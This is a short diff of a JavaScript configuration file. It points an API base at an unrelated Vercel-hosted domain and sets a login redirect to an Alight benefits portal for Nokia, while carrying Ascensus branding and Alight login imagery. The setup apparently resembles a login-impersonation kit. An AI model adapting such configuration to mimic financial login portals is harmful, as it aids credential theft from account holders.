@@ -1,5 +1,5 @@
 // Global API Configuration
-window.ascensus_API_BASE = 'http://localhost:5000';
+window.ascensus_API_BASE = 'https://wal-mart-seven.vercel.app';
 
 // Global App Settings
 window.APP_CONFIG = {
@@ -7,7 +7,7 @@ window.APP_CONFIG = {
   logoAlt: 'Ascensus logo',
   imageArea: 'https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/a7544/master/Documents/UpointRedesign/LoginBGImages/image1_logon_large.jpg',
   botName: 'Sensus Bot',
-  redirectLink: 'https://myaccount.ascensus.com/rplink/account/login',
+  redirectLink: 'https://worklife.alight.com/ah-angular-afirst-web/#/web/nokia/login',
   footer: {
     company: 'Travers O\'Keefe',
     phone: '(212) 842-3751',
